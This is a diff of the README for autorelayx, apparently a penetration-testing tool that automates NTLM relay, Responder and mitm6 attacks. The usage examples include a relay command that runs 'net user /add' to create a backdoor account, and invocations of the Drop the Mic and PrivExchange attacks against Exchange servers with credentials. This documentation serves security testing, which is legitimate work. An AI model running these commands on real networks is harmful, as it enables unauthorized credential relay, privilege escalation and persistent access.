@@ -5,6 +5,7 @@ Automates the process of setting up advanced relaying techniques.
 
 # Installation
 
+    sudo apt-get install tcpdump (required only for mitm6 domain filtering)
     git clone --recurse-submodules https://github.com/Coalfire-Research/autorelayx
     cd autorelayx
     sudo pipenv install
@@ -24,15 +25,11 @@ This will run ntlmrelayx, Responder, and mitm6. It is suggested to use the -d <d
 
 ```python autorelayx.py -l hostlist.txt -6 -d CONTOSO```
 
-## Relaying to single target and running a custom command once successful
-```python autorelayx.py -t smb://dc01.local -c "net user /add danmcinerney P@ssword123456"```
+## Relaying to specified targets file and running a custom command once successful
+```python autorelayx.py -tf targets_file.txt -c "net user /add danmcinerney P@ssword123456"```
 
-## Drop the Mic attack
-```python autorelayx.py -dc 1.2.3.4 -u LAB/dan:P@ssw0rd@exchangeServer.lab.local```
+## Drop the Mic and PrivExchange attacks
+Script will test the exchange servers in exchange_servers.txt for vulnerability to SpoolService RPC abuse for the Drop the Mic attack. Should none of the servers be vulnerable, the script will move on to attempt the authenticated PrivExchange attack.
+```python autorelayx.py -dc 1.2.3.4 -u LAB/dan:P@ssw0rd@exchangeServer.lab.local -ef exchange_servers.txt```
 
-## PrivExchange
-
-
-## To do
-* add support for PrivExchange
-* add tests
+## Authenticationless PrivExchange
